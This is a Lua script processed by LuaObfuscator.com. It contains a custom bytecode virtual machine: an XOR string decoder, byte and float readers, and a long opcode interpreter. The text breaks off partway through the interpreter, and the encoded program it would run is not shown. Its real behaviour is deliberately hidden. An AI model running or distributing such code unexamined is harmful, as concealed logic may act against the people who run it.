--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.9) ~  Much Love, Ferib 

]]--

do
	local v0 = string.char;
	local v1 = string.byte;
	local v2 = string.sub;
	local v3 = bit32 or bit;
	local v4 = v3.bxor;
	local v5 = table.concat;
	local v6 = table.insert;
	local function v7(v24, v25)
		local v26 = 0;
		local v27;
		while true do
			if (v26 == 1) then
				return v5(v27);
			end
			if (v26 == 0) then
				v27 = {};
				for v44 = 1, #v24 do
					v6(v27, v0(v4(v1(v2(v24, v44, v44 + 1)), v1(v2(v25, 1 + (v44 % #v25), 1 + (v44 % #v25) + 1))) % 256));
				end
				v26 = 1;
			end
		end
	end
	local v8 = tonumber;
	local v9 = string.byte;
	local v10 = string.char;
	local v11 = string.sub;
	local v12 = string.gsub;
	local v13 = string.rep;
	local v14 = table.concat;
	local v15 = table.insert;
	local v16 = math.ldexp;
	local v17 = getfenv or function()
		return _ENV;
	end;
	local v18 = setmetatable;
	local v19 = pcall;
	local v20 = select;
	local v21 = unpack or table.unpack;
	local v22 = tonumber;
	local function v23(v28, v29, ...)
		local v30 = 0;
		local v31;
		local v32;
		local v33;
		local v34;
		local v35;
		local v36;
		local v37;
		local v38;
		local v39;
		local v40;
		local v41;
		local v42;
		local v43;
		while true do
			if (v30 == 1) then
				v35 = nil;
				v36 = nil;
				v37 = nil;
				v38 = nil;
				v30 = 2;
			end
			if (2 == v30) then
				v39 = nil;
				v40 = nil;
				v41 = nil;
				v42 = nil;
				v30 = 3;
			end
			if (v30 == 0) then
				v31 = 0;
				v32 = nil;
				v33 = nil;
				v34 = nil;
				v30 = 1;
			end
			if (v30 == 3) then
				v43 = nil;
				while true do
					local v45 = 0;
					while true do
						if (v45 == 1) then
							if (0 == v31) then
								local v46 = 0;
								while true do
									if (v46 == 1) then
										v28 = v12(v11(v28, 5), v7("\21\96", "\45\59\78\212\54"), function(v52)
											if (v9(v52, 2) == 79) then
												local v97 = 0;
												while true do
													if (v97 == 0) then
														v33 = v8(v11(v52, 2 - 1, 1));
														return "";
													end
												end
											else
												local v98 = 0;
												local v99;
												local v100;
												while true do
													if (v98 == 1) then
														while true do
															if (v99 == 0) then
																v100 = v10(v8(v52, 16));
																if v33 then
																	local v142 = 0;
																	local v143;
																	while true do
																		if (1 == v142) then
																			return v143;
																		end
																		if (v142 == 0) then
																			v143 = v13(v100, v33);
																			v33 = nil;
																			v142 = 1;
																		end
																	end
																else
																	return v100;
																end
																break;
															end
														end
														break;
													end
													if (v98 == 0) then
														v99 = 0;
														v100 = nil;
														v98 = 1;
													end
												end
											end
										end);
										v34 = nil;
										v46 = 2;
									end
									if (v46 == 0) then
										v32 = 1;
										v33 = nil;
										v46 = 1;
									end
									if (v46 == 2) then
										v31 = 1;
										break;
									end
								end
							end
							if (v31 == 4) then
								local v47 = 0;
								while true do
									if (v47 == 2) then
										v31 = 5;
										break;
									end
									if (0 == v47) then
										v41 = nil;
										function v41(...)
											return {...}, v20("#", ...);
										end
										v47 = 1;
									end
									if (v47 == 1) then
										v42 = nil;
										function v42()
											local v53 = 0;
											local v54;
											local v55;
											local v56;
											local v57;
											local v58;
											local v59;
											while true do
												if (v53 == 0) then
													v54 = {};
													v55 = {};
													v56 = {};
													v53 = 1;
												end
												if (v53 == 1) then
													v57 = {v54,v55,nil,v56};
													v58 = v37();
													v59 = {};
													v53 = 2;
												end
												if (v53 == 3) then
													for v108 = 1, v37() do
														v55[v108 - 1] = v42();
													end
													return v57;
												end
												if (v53 == 2) then
													for v110 = 1, v58 do
														local v111 = 0;
														local v112;
														local v113;
														while true do
															if (v111 == 0) then
																v112 = v35();
																v113 = nil;
																v111 = 1;
															end
															if (v111 == 1) then
																if (v112 == (1 + 0)) then
																	v113 = v35() ~= 0;
																elseif (v112 == (879 - (282 + 595))) then
																	v113 = v38();
																elseif (v112 == 3) then
																	v113 = v39();
																end
																v59[v110] = v113;
																break;
															end
														end
													end
													v57[3] = v35();
													for v114 = 1, v37() do
														local v115 = 0;
														local v116;
														while true do
															if (v115 == 0) then
																v116 = v35();
																if (v34(v116, 1, 1) == 0) then
																	local v126 = 0;
																	local v127;
																	local v128;
																	local v129;
																	while true do
																		if (v126 == 0) then
																			v127 = v34(v116, 1639 - (1523 + 114), 3);
																			v128 = v34(v116, 4, 6);
																			v126 = 1;
																		end
																		if (v126 == 3) then
																			if (v34(v128, 3, 3) == 1) then
																				v129[4] = v59[v129[4]];
																			end
																			v54[v114] = v129;
																			break;
																		end
																		if (v126 == 2) then
																			if (v34(v128, 1, 1) == 1) then
																				v129[2] = v59[v129[2]];
																			end
																			if (v34(v128, 2, 2) == 1) then
																				v129[3] = v59[v129[3]];
																			end
																			v126 = 3;
																		end
																		if (v126 == 1) then
																			v129 = {v36(),v36(),nil,nil};
																			if (v127 == (0 + 0)) then
																				local v171 = 0;
																				while true do
																					if (v171 == 0) then
																						v129[3] = v36();
																						v129[4] = v36();
																						break;
																					end
																				end
																			elseif (v127 == 1) then
																				v129[3] = v37();
																			elseif (v127 == 2) then
																				v129[3 - 0] = v37() - (2 ^ 16);
																			elseif (v127 == (1068 - (68 + 997))) then
																				local v186 = 0;
																				local v187;
																				while true do
																					if (v186 == 0) then
																						v187 = 0;
																						while true do
																							if (0 == v187) then
																								v129[3] = v37() - (2 ^ 16);
																								v129[4] = v36();
																								break;
																							end
																						end
																						break;
																					end
																				end
																			end
																			v126 = 2;
																		end
																	end
																end
																break;
															end
														end
													end
													v53 = 3;
												end
											end
										end
										v47 = 2;
									end
								end
							end
							v45 = 2;
						end
						if (2 == v45) then
							if (v31 == 1) then
								local v48 = 0;
								while true do
									if (1 == v48) then
										function v35()
											local v60 = 0;
											local v61;
											local v62;
											while true do
												if (v60 == 1) then
													while true do
														local v117 = 0;
														while true do
															if (v117 == 0) then
																if (0 == v61) then
																	local v130 = 0;
																	while true do
																		if (v130 == 1) then
																			v61 = 1;
																			break;
																		end
																		if (v130 == 0) then
																			v62 = v9(v28, v32, v32);
																			v32 = v32 + 1;
																			v130 = 1;
																		end
																	end
																end
																if (v61 == 1) then
																	return v62;
																end
																break;
															end
														end
													end
													break;
												end
												if (v60 == 0) then
													v61 = 0;
													v62 = nil;
													v60 = 1;
												end
											end
										end
										v36 = nil;
										v48 = 2;
									end
									if (v48 == 0) then
										function v34(v63, v64, v65)
											if v65 then
												local v101 = 0;
												local v102;
												local v103;
												while true do
													if (v101 == 1) then
														while true do
															if (v102 == 0) then
																local v124 = 0;
																while true do
																	if (v124 == 0) then
																		v103 = (v63 / (2 ^ (v64 - (2 - 1)))) % (2 ^ (((v65 - 1) - (v64 - 1)) + (1 - 0)));
																		return v103 - (v103 % 1);
																	end
																end
															end
														end
														break;
													end
													if (v101 == 0) then
														v102 = 0;
														v103 = nil;
														v101 = 1;
													end
												end
											else
												local v104 = 0;
												local v105;
												local v106;
												while true do
													if (v104 == 1) then
														while true do
															if (v105 == 0) then
																local v125 = 0;
																while true do
																	if (0 == v125) then
																		v106 = 2 ^ (v64 - 1);
																		return (((v63 % (v106 + v106)) >= v106) and (2 - 1)) or 0;
																	end
																end
															end
														end
														break;
													end
													if (v104 == 0) then
														v105 = 0;
														v106 = nil;
														v104 = 1;
													end
												end
											end
										end
										v35 = nil;
										v48 = 1;
									end
									if (v48 == 2) then
										v31 = 2;
										break;
									end
								end
							end
							if (v31 == 3) then
								local v49 = 0;
								while true do
									if (v49 == 2) then
										v31 = 4;
										break;
									end
									if (v49 == 0) then
										function v38()
											local v66 = 0;
											local v67;
											local v68;
											local v69;
											local v70;
											local v71;
											local v72;
											local v73;
											while true do
												if (v66 == 0) then
													v67 = 0;
													v68 = nil;
													v66 = 1;
												end
												if (v66 == 3) then
													v73 = nil;
													while true do
														local v118 = 0;
														while true do
															if (v118 == 1) then
																if (v67 == 1) then
																	local v131 = 0;
																	while true do
																		if (v131 == 1) then
																			v67 = 2;
																			break;
																		end
																		if (v131 == 0) then
																			v70 = 1;
																			v71 = (v34(v69, 1, 20) * (2 ^ 32)) + v68;
																			v131 = 1;
																		end
																	end
																end
																if (v67 == 3) then
																	local v132 = 0;
																	while true do
																		if (v132 == 0) then
																			if (v72 == (568 - (367 + 201))) then
																				if (v71 == 0) then
																					return v73 * 0;
																				else
																					local v175 = 0;
																					while true do
																						if (v175 == 0) then
																							v72 = 1;
																							v70 = 0;
																							break;
																						end
																					end
																				end
																			elseif (v72 == 2047) then
																				return ((v71 == 0) and (v73 * (1 / 0))) or (v73 * NaN);
																			end
																			return v16(v73, v72 - 1023) * (v70 + (v71 / (2 ^ 52)));
																		end
																	end
																end
																break;
															end
															if (0 == v118) then
																if (2 == v67) then
																	local v133 = 0;
																	while true do
																		if (v133 == 1) then
																			v67 = 3;
																			break;
																		end
																		if (0 == v133) then
																			v72 = v34(v69, 21, 31);
																			v73 = ((v34(v69, 32) == (620 - (555 + 64))) and -1) or (932 - (857 + 74));
																			v133 = 1;
																		end
																	end
																end
																if (v67 == 0) then
																	local v134 = 0;
																	while true do
																		if (v134 == 1) then
																			v67 = 1;
																			break;
																		end
																		if (v134 == 0) then
																			v68 = v37();
																			v69 = v37();
																			v134 = 1;
																		end
																	end
																end
																v118 = 1;
															end
														end
													end
													break;
												end
												if (v66 == 2) then
													v71 = nil;
													v72 = nil;
													v66 = 3;
												end
												if (v66 == 1) then
													v69 = nil;
													v70 = nil;
													v66 = 2;
												end
											end
										end
										v39 = nil;
										v49 = 1;
									end
									if (v49 == 1) then
										function v39(v74)
											local v75 = 0;
											local v76;
											local v77;
											local v78;
											while true do
												if (v75 == 0) then
													v76 = 0;
													v77 = nil;
													v75 = 1;
												end
												if (v75 == 1) then
													v78 = nil;
													while true do
														local v119 = 0;
														while true do
															if (v119 == 0) then
																if (1 == v76) then
																	local v135 = 0;
																	while true do
																		if (v135 == 0) then
																			v77 = v11(v28, v32, (v32 + v74) - 1);
																			v32 = v32 + v74;
																			v135 = 1;
																		end
																		if (v135 == 1) then
																			v76 = 2;
																			break;
																		end
																	end
																end
																if (3 == v76) then
																	return v14(v78);
																end
																v119 = 1;
															end
															if (v119 == 1) then
																if (v76 == 0) then
																	local v136 = 0;
																	while true do
																		if (v136 == 1) then
																			v76 = 1;
																			break;
																		end
																		if (v136 == 0) then
																			v77 = nil;
																			if not v74 then
																				local v172 = 0;
																				local v173;
																				while true do
																					if (v172 == 0) then
																						v173 = 0;
																						while true do
																							if (v173 == 0) then
																								v74 = v37();
																								if (v74 == 0) then
																									return "";
																								end
																								break;
																							end
																						end
																						break;
																					end
																				end
																			end
																			v136 = 1;
																		end
																	end
																end
																if (v76 == 2) then
																	local v137 = 0;
																	while true do
																		if (1 == v137) then
																			v76 = 3;
																			break;
																		end
																		if (v137 == 0) then
																			v78 = {};
																			for v148 = 1, #v77 do
																				v78[v148] = v10(v9(v11(v77, v148, v148)));
																			end
																			v137 = 1;
																		end
																	end
																end
																break;
															end
														end
													end
													break;
												end
											end
										end
										v40 = v37;
										v49 = 2;
									end
								end
							end
							break;
						end
						if (v45 == 0) then
							if (v31 == 2) then
								local v50 = 0;
								while true do
									if (v50 == 2) then
										v31 = 3;
										break;
									end
									if (v50 == 0) then
										function v36()
											local v79 = 0;
											local v80;
											local v81;
											local v82;
											while true do
												if (v79 == 0) then
													v80 = 0;
													v81 = nil;
													v79 = 1;
												end
												if (v79 == 1) then
													v82 = nil;
													while true do
														local v120 = 0;
														while true do
															if (0 == v120) then
																if (1 == v80) then
																	return (v82 * 256) + v81;
																end
																if (v80 == 0) then
																	local v138 = 0;
																	while true do
																		if (v138 == 1) then
																			v80 = 1;
																			break;
																		end
																		if (0 == v138) then
																			v81, v82 = v9(v28, v32, v32 + 2);
																			v32 = v32 + 2;
																			v138 = 1;
																		end
																	end
																end
																break;
															end
														end
													end
													break;
												end
											end
										end
										v37 = nil;
										v50 = 1;
									end
									if (v50 == 1) then
										function v37()
											local v83 = 0;
											local v84;
											local v85;
											local v86;
											local v87;
											local v88;
											while true do
												if (v83 == 1) then
													v86 = nil;
													v87 = nil;
													v83 = 2;
												end
												if (v83 == 0) then
													v84 = 0;
													v85 = nil;
													v83 = 1;
												end
												if (v83 == 2) then
													v88 = nil;
													while true do
														local v121 = 0;
														while true do
															if (v121 == 0) then
																if (v84 == 1) then
																	return (v88 * 16777216) + (v87 * 65536) + (v86 * 256) + v85;
																end
																if (v84 == 0) then
																	local v139 = 0;
																	while true do
																		if (v139 == 0) then
																			v85, v86, v87, v88 = v9(v28, v32, v32 + 3);
																			v32 = v32 + 4;
																			v139 = 1;
																		end
																		if (v139 == 1) then
																			v84 = 1;
																			break;
																		end
																	end
																end
																break;
															end
														end
													end
													break;
												end
											end
										end
										v38 = nil;
										v50 = 2;
									end
								end
							end
							if (v31 == 5) then
								local v51 = 0;
								while true do
									if (v51 == 1) then
										return v43(v42(), {}, v29)(...);
									end
									if (v51 == 0) then
										v43 = nil;
										function v43(v89, v90, v91)
											local v92 = 0;
											local v93;
											local v94;
											local v95;
											local v96;
											while true do
												if (v92 == 2) then
													while true do
														local v122 = 0;
														while true do
															if (v122 == 0) then
																if (v93 == 0) then
																	local v140 = 0;
																	while true do
																		if (v140 == 0) then
																			v94 = v89[1];
																			v95 = v89[2];
																			v140 = 1;
																		end
																		if (v140 == 1) then
																			v93 = 1;
																			break;
																		end
																	end
																end
																if (v93 == 1) then
																	local v141 = 0;
																	while true do
																		if (v141 == 0) then
																			v96 = v89[3];
																			return function(...)
																				local v150 = 0;
																				local v151;
																				local v152;
																				local v153;
																				local v154;
																				local v155;
																				local v156;
																				local v157;
																				local v158;
																				local v159;
																				local v160;
																				local v161;
																				local v162;
																				local v163;
																				local v164;
																				while true do
																					if (0 == v150) then
																						v151 = v94;
																						v152 = v95;
																						v153 = v96;
																						v150 = 1;
																					end
																					if (5 == v150) then
																						while true do
																							local v178 = 0;
																							local v179;
																							while true do
																								if (0 == v178) then
																									v179 = 0;
																									while true do
																										if (v179 == 1) then
																											if (v164 <= (1287 - (226 + 1044))) then
																												if (v164 <= 8) then
																													if (v164 <= 3) then
																														if (v164 <= 1) then
																															if (v164 > 0) then
																																v161[v163[2]] = v91[v163[3]];
																															else
																																v161[v163[2]] = v163[3] ~= 0;
																															end
																														elseif (v164 == 2) then
																															v161[v163[2]] = v161[v163[3]];
																														else
																															local v198 = 0;
																															local v199;
																															local v200;
																															local v201;
																															local v202;
																															while true do
																																if (v198 == 0) then
																																	v199 = 0;
																																	v200 = nil;
																																	v198 = 1;
																																end
																																if (v198 == 1) then
																																	v201 = nil;
																																	v202 = nil;
																																	v198 = 2;
																																end
																																if (v198 == 2) then
																																	while true do
																																		if (2 == v199) then
																																			for v402 = 1, v163[4] do
																																				local v403 = 0;
																																				local v404;
																																				local v405;
																																				while true do
																																					if (0 == v403) then
																																						v404 = 0;
																																						v405 = nil;
																																						v403 = 1;
																																					end
																																					if (v403 == 1) then
																																						while true do
																																							if (v404 == 1) then
																																								if (v405[4 - 3] == (119 - (32 + 85))) then
																																									v202[v402 - 1] = {v161,v405[3]};
																																								else
																																									v202[v402 - (1 + 0)] = {v90,v405[3]};
																																								end
																																								v160[#v160 + 1] = v202;
																																								break;
																																							end
																																							if (v404 == 0) then
																																								local v544 = 0;
																																								while true do
																																									if (v544 == 1) then
																																										v404 = 1;
																																										break;
																																									end
																																									if (v544 == 0) then
																																										v155 = v155 + 1;
																																										v405 = v151[v155];
																																										v544 = 1;
																																									end
																																								end
																																							end
																																						end
																																						break;
																																					end
																																				end
																																			end
																																			v161[v163[2]] = v43(v200, v201, v91);
																																			break;
																																		end
																																		if (v199 == 0) then
																																			local v378 = 0;
																																			while true do
																																				if (v378 == 0) then
																																					v200 = v152[v163[3]];
																																					v201 = nil;
																																					v378 = 1;
																																				end
																																				if (v378 == 1) then
																																					v199 = 1;
																																					break;
																																				end
																																			end
																																		end
																																		if (v199 == 1) then
																																			local v379 = 0;
																																			while true do
																																				if (v379 == 1) then
																																					v199 = 2;
																																					break;
																																				end
																																				if (v379 == 0) then
																																					v202 = {};
																																					v201 = v18({}, {[v7("\18\154\67\210\68\135\53", "\226\77\197\42\188\32")]=function(v494, v495)
																																						local v496 = 0;
																																						local v497;
																																						while true do
																																							if (0 == v496) then
																																								v497 = v202[v495];
																																								return v497[1][v497[2]];
																																							end
																																						end
																																					end,[v7("\5\41\250\176\45\31\250\177\63\14", "\213\90\118\148")]=function(v498, v499, v500)
																																						local v501 = 0;
																																						local v502;
																																						local v503;
																																						while true do
																																							if (v501 == 1) then
																																								while true do
																																									if (v502 == 0) then
																																										v503 = v202[v499];
																																										v503[1][v503[2]] = v500;
																																										break;
																																									end
																																								end
																																								break;
																																							end
																																							if (v501 == 0) then
																																								v502 = 0;
																																								v503 = nil;
																																								v501 = 1;
																																							end
																																						end
																																					end});
																																					v379 = 1;
																																				end
																																			end
																																		end
																																	end
																																	break;
																																end
																															end
																														end
																													elseif (v164 <= 5) then
																														if (v164 == 4) then
																															local v203 = 0;
																															local v204;
																															local v205;
																															local v206;
																															local v207;
																															while true do
																																if (v203 == 2) then
																																	while true do
																																		if (0 == v204) then
																																			local v380 = 0;
																																			while true do
																																				if (v380 == 1) then
																																					v204 = 1;
																																					break;
																																				end
																																				if (v380 == 0) then
																																					v205 = v163[959 - (892 + 65)];
																																					v206 = v161[v205];
																																					v380 = 1;
																																				end
																																			end
																																		end
																																		if (v204 == 1) then
																																			v207 = v161[v205 + 2];
																																			if (v207 > 0) then
																																				if (v206 > v161[v205 + 1]) then
																																					v155 = v163[3];
																																				else
																																					v161[v205 + 3] = v206;
																																				end
																																			elseif (v206 < v161[v205 + 1]) then
																																				v155 = v163[3];
																																			else
																																				v161[v205 + 3] = v206;
																																			end
																																			break;
																																		end
																																	end
																																	break;
																																end
																																if (v203 == 1) then
																																	v206 = nil;
																																	v207 = nil;
																																	v203 = 2;
																																end
																																if (0 == v203) then
																																	v204 = 0;
																																	v205 = nil;
																																	v203 = 1;
																																end
																															end
																														else
																															local v208 = 0;
																															local v209;
																															local v210;
																															local v211;
																															local v212;
																															local v213;
																															while true do
																																if (v208 == 0) then
																																	v209 = 0;
																																	v210 = nil;
																																	v208 = 1;
																																end
																																if (v208 == 2) then
																																	v213 = nil;
																																	while true do
																																		if (v209 == 7) then
																																			local v382 = 0;
																																			while true do
																																				if (2 == v382) then
																																					v155 = v155 + 1;
																																					v163 = v151[v155];
																																					v382 = 3;
																																				end
																																				if (v382 == 3) then
																																					v161[v163[2]] = v163[3] + v161[v163[4]];
																																					v155 = v155 + 1 + 0;
																																					v382 = 4;
																																				end
																																				if (0 == v382) then
																																					v161[v163[2]] = #v161[v163[3]];
																																					v155 = v155 + 1;
																																					v382 = 1;
																																				end
																																				if (v382 == 1) then
																																					v163 = v151[v155];
																																					v161[v163[2]] = v161[v163[3]] % v161[v163[4]];
																																					v382 = 2;
																																				end
																																				if (4 == v382) then
																																					v209 = 8;
																																					break;
																																				end
																																			end
																																		end
																																		if (3 == v209) then
																																			local v383 = 0;
																																			while true do
																																				if (4 == v383) then
																																					v209 = 4;
																																					break;
																																				end
																																				if (v383 == 3) then
																																					v210 = 0;
																																					for v508 = v213, v156 do
																																						local v509 = 0;
																																						while true do
																																							if (v509 == 0) then
																																								v210 = v210 + 1;
																																								v161[v508] = v211[v210];
																																								break;
																																							end
																																						end
																																					end
																																					v383 = 4;
																																				end
																																				if (v383 == 1) then
																																					v163 = v151[v155];
																																					v213 = v163[2];
																																					v383 = 2;
																																				end
																																				if (v383 == 2) then
																																					v211, v212 = v154(v161[v213](v21(v161, v213 + (2 - 1), v163[3])));
																																					v156 = (v212 + v213) - 1;
																																					v383 = 3;
																																				end
																																				if (v383 == 0) then
																																					v161[v163[2]] = v161[v163[3]] + v163[4];
																																					v155 = v155 + 1;
																																					v383 = 1;
																																				end
																																			end
																																		end
																																		if (v209 == 0) then
																																			local v384 = 0;
																																			while true do
																																				if (v384 == 4) then
																																					v209 = 1;
																																					break;
																																				end
																																				if (0 == v384) then
																																					v210 = nil;
																																					v211, v212 = nil;
																																					v384 = 1;
																																				end
																																				if (2 == v384) then
																																					v155 = v155 + 1;
																																					v163 = v151[v155];
																																					v384 = 3;
																																				end
																																				if (v384 == 1) then
																																					v213 = nil;
																																					v161[v163[2]] = v161[v163[7 - 4]];
																																					v384 = 2;
																																				end
																																				if (v384 == 3) then
																																					v161[v163[3 - 1]] = v90[v163[4 - 1]];
																																					v155 = v155 + 1;
																																					v384 = 4;
																																				end
																																			end
																																		end
																																		if (12 == v209) then
																																			v213 = v163[2];
																																			v161[v213](v21(v161, v213 + 1, v156));
																																			break;
																																		end
																																		if (v209 == 8) then
																																			local v386 = 0;
																																			while true do
																																				if (v386 == 3) then
																																					v156 = (v212 + v213) - 1;
																																					v210 = 0;
																																					v386 = 4;
																																				end
																																				if (v386 == 0) then
																																					v163 = v151[v155];
																																					v161[v163[2]] = v161[v163[3]] + v163[4];
																																					v386 = 1;
																																				end
																																				if (v386 == 1) then
																																					v155 = v155 + 1;
																																					v163 = v151[v155];
																																					v386 = 2;
																																				end
																																				if (v386 == 4) then
																																					v209 = 9;
																																					break;
																																				end
																																				if (v386 == 2) then
																																					v213 = v163[2];
																																					v211, v212 = v154(v161[v213](v21(v161, v213 + 1, v163[3])));
																																					v386 = 3;
																																				end
																																			end
																																		end
																																		if (v209 == 10) then
																																			local v387 = 0;
																																			while true do
																																				if (4 == v387) then
																																					v209 = 11;
																																					break;
																																				end
																																				if (v387 == 1) then
																																					v213 = v163[2];
																																					v161[v213] = v161[v213](v21(v161, v213 + 1, v156));
																																					v387 = 2;
																																				end
																																				if (v387 == 2) then
																																					v155 = v155 + 1;
																																					v163 = v151[v155];
																																					v387 = 3;
																																				end
																																				if (v387 == 0) then
																																					v155 = v155 + 1;
																																					v163 = v151[v155];
																																					v387 = 1;
																																				end
																																				if (v387 == 3) then
																																					v161[v163[2]] = v161[v163[3]] % v163[4];
																																					v155 = v155 + 1;
																																					v387 = 4;
																																				end
																																			end
																																		end
																																		if (v209 == 11) then
																																			local v388 = 0;
																																			while true do
																																				if (v388 == 4) then
																																					v209 = 12;
																																					break;
																																				end
																																				if (v388 == 1) then
																																					v211, v212 = v154(v161[v213](v161[v213 + 1]));
																																					v156 = (v212 + v213) - 1;
																																					v388 = 2;
																																				end
																																				if (v388 == 2) then
																																					v210 = 0;
																																					for v510 = v213, v156 do
																																						local v511 = 0;
																																						local v512;
																																						while true do
																																							if (v511 == 0) then
																																								v512 = 0;
																																								while true do
																																									if (v512 == 0) then
																																										v210 = v210 + 1;
																																										v161[v510] = v211[v210];
																																										break;
																																									end
																																								end
																																								break;
																																							end
																																						end
																																					end
																																					v388 = 3;
																																				end
																																				if (v388 == 3) then
																																					v155 = v155 + 1;
																																					v163 = v151[v155];
																																					v388 = 4;
																																				end
																																				if (v388 == 0) then
																																					v163 = v151[v155];
																																					v213 = v163[2];
																																					v388 = 1;
																																				end
																																			end
																																		end
																																		if (v209 == 9) then
																																			local v389 = 0;
																																			while true do
																																				if (1 == v389) then
																																					v163 = v151[v155];
																																					v213 = v163[2];
																																					v389 = 2;
																																				end
																																				if (4 == v389) then
																																					v209 = 10;
																																					break;
																																				end
																																				if (3 == v389) then
																																					v210 = 0;
																																					for v513 = v213, v156 do
																																						local v514 = 0;
																																						local v515;
																																						while true do
																																							if (0 == v514) then
																																								v515 = 0;
																																								while true do
																																									if (v515 == 0) then
																																										v210 = v210 + 1;
																																										v161[v513] = v211[v210];
																																										break;
																																									end
																																								end
																																								break;
																																							end
																																						end
																																					end
																																					v389 = 4;
																																				end
																																				if (v389 == 2) then
																																					v211, v212 = v154(v161[v213](v21(v161, v213 + (2 - 1), v156)));
																																					v156 = (v212 + v213) - 1;
																																					v389 = 3;
																																				end
																																				if (0 == v389) then
																																					for v516 = v213, v156 do
																																						local v517 = 0;
																																						while true do
																																							if (v517 == 0) then
																																								v210 = v210 + (998 - (915 + 82));
																																								v161[v516] = v211[v210];
																																								break;
																																							end
																																						end
																																					end
																																					v155 = v155 + 1;
																																					v389 = 1;
																																				end
																																			end
																																		end
																																		if (5 == v209) then
																																			local v390 = 0;
																																			while true do
																																				if (1 == v390) then
																																					v155 = v155 + (953 - (802 + 150));
																																					v163 = v151[v155];
																																					v390 = 2;
																																				end
																																				if (v390 == 4) then
																																					v209 = 6;
																																					break;
																																				end
																																				if (v390 == 2) then
																																					v161[v163[2]] = v161[v163[7 - 4]];
																																					v155 = v155 + 1;
																																					v390 = 3;
																																				end
																																				if (v390 == 3) then
																																					v163 = v151[v155];
																																					v161[v163[2]] = #v161[v163[3]];
																																					v390 = 4;
																																				end
																																				if (v390 == 0) then
																																					v163 = v151[v155];
																																					v161[v163[2]] = v90[v163[3]];
																																					v390 = 1;
																																				end
																																			end
																																		end
																																		if (2 == v209) then
																																			local v391 = 0;
																																			while true do
																																				if (1 == v391) then
																																					v161[v163[2]] = v161[v163[3 + 0]];
																																					v155 = v155 + 1;
																																					v391 = 2;
																																				end
																																				if (v391 == 0) then
																																					v155 = v155 + 1;
																																					v163 = v151[v155];
																																					v391 = 1;
																																				end
																																				if (4 == v391) then
																																					v209 = 3;
																																					break;
																																				end
																																				if (v391 == 3) then
																																					v155 = v155 + 1;
																																					v163 = v151[v155];
																																					v391 = 4;
																																				end
																																				if (2 == v391) then
																																					v163 = v151[v155];
																																					v161[v163[2]] = v161[v163[3]];
																																					v391 = 3;
																																				end
																																			end
																																		end
																																		if (v209 == 1) then
																																			local v392 = 0;
																																			while true do
																																				if (v392 == 2) then
																																					v161[v163[182 - (67 + 113)]] = v90[v163[3]];
																																					v155 = v155 + 1;
																																					v392 = 3;
																																				end
																																				if (v392 == 0) then
																																					v163 = v151[v155];
																																					v161[v163[352 - (87 + 263)]] = v90[v163[3]];
																																					v392 = 1;
																																				end
																																				if (v392 == 3) then
																																					v163 = v151[v155];
																																					v161[v163[2]] = v90[v163[3]];
																																					v392 = 4;
																																				end
																																				if (v392 == 1) then
																																					v155 = v155 + 1;
																																					v163 = v151[v155];
																																					v392 = 2;
																																				end
																																				if (v392 == 4) then
																																					v209 = 2;
																																					break;
																																				end
																																			end
																																		end
																																		if (6 == v209) then
																																			local v393 = 0;
																																			while true do
																																				if (v393 == 0) then
																																					v155 = v155 + 1;
																																					v163 = v151[v155];
																																					v393 = 1;
																																				end
																																				if (v393 == 3) then
																																					v155 = v155 + 1;
																																					v163 = v151[v155];
																																					v393 = 4;
																																				end
																																				if (v393 == 2) then
																																					v163 = v151[v155];
																																					v161[v163[2]] = v163[5 - 2] + v161[v163[4]];
																																					v393 = 3;
																																				end
																																				if (4 == v393) then
																																					v209 = 7;
																																					break;
																																				end
																																				if (v393 == 1) then
																																					v161[v163[2]] = v161[v163[3]] % v161[v163[4]];
																																					v155 = v155 + 1;
																																					v393 = 2;
																																				end
																																			end
																																		end
																																		if (v209 == 4) then
																																			local v394 = 0;
																																			while true do
																																				if (v394 == 1) then
																																					v213 = v163[2 + 0];
																																					v161[v213] = v161[v213](v21(v161, v213 + 1, v156));
																																					v394 = 2;
																																				end
																																				if (v394 == 2) then
																																					v155 = v155 + 1;
																																					v163 = v151[v155];
																																					v394 = 3;
																																				end
																																				if (v394 == 4) then
																																					v209 = 5;
																																					break;
																																				end
																																				if (v394 == 3) then
																																					v161[v163[2]] = v90[v163[11 - 8]];
																																					v155 = v155 + 1;
																																					v394 = 4;
																																				end
																																				if (v394 == 0) then
																																					v155 = v155 + 1;
																																					v163 = v151[v155];
																																					v394 = 1;
																																				end
																																			end
																																		end
																																	end
																																	break;
																																end
																																if (v208 == 1) then
																																	v211 = nil;
																																	v212 = nil;
																																	v208 = 2;
																																end
																															end
																														end
																													elseif (v164 <= 6) then
																														v155 = v163[3];
																													elseif (v164 == 7) then
																														v161[v163[2 + 0]] = v163[3] + v161[v163[4]];
																													else
																														local v272 = 0;
																														local v273;
																														while true do
																															if (v272 == 0) then
																																v273 = 0;
																																while true do
																																	if (v273 == 5) then
																																		v163 = v151[v155];
																																		if not v161[v163[2]] then
																																			v155 = v155 + 1;
																																		else
																																			v155 = v163[3];
																																		end
																																		break;
																																	end
																																	if (0 == v273) then
																																		local v419 = 0;
																																		while true do
																																			if (v419 == 0) then
																																				v161[v163[2 - 0]] = v91[v163[3]];
																																				v155 = v155 + 1;
																																				v419 = 1;
																																			end
																																			if (v419 == 1) then
																																				v163 = v151[v155];
																																				v161[v163[2]] = v161[v163[3]][v163[4]];
																																				v419 = 2;
																																			end
																																			if (v419 == 2) then
																																				v273 = 1;
																																				break;
																																			end
																																		end
																																	end
																																	if (v273 == 1) then
																																		local v420 = 0;
																																		while true do
																																			if (v420 == 0) then
																																				v155 = v155 + 1;
																																				v163 = v151[v155];
																																				v420 = 1;
																																			end
																																			if (v420 == 2) then
																																				v273 = 2;
																																				break;
																																			end
																																			if (1 == v420) then
																																				v161[v163[2]] = v91[v163[1190 - (1069 + 118)]];
																																				v155 = v155 + 1;
																																				v420 = 2;
																																			end
																																		end
																																	end
																																	if (2 == v273) then
																																		local v421 = 0;
																																		while true do
																																			if (2 == v421) then
																																				v273 = 3;
																																				break;
																																			end
																																			if (v421 == 1) then
																																				v155 = v155 + 1;
																																				v163 = v151[v155];
																																				v421 = 2;
																																			end
